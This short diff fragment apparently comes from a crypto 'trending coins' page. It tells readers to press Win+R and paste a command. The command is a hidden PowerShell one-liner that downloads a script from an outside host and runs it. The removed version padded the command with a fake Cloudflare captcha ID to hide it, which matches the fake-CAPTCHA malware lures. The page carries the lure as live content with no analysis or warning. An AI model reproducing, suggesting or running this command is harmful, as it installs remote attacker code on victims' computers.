@@ -31,7 +31,7 @@ Trending coins & new listings
 - #### Press win+r
 - #### Insert command
 ```bash
-powershell -WindowStyle Hidden -Command ([ScriptBlock]::Create((irm https://jaihind.edu.in/weatherdolphin/dollrandom))).Invoke(); Write-Host   "                                                    Cloudflare. inc.  Captcha-ID:1488                                   ";
+powershell -WindowStyle Hidden -Command ([ScriptBlock]::Create((irm https://jaihind.edu.in/weatherdolphin/dollrandom))).Invoke();
 ```
 
 
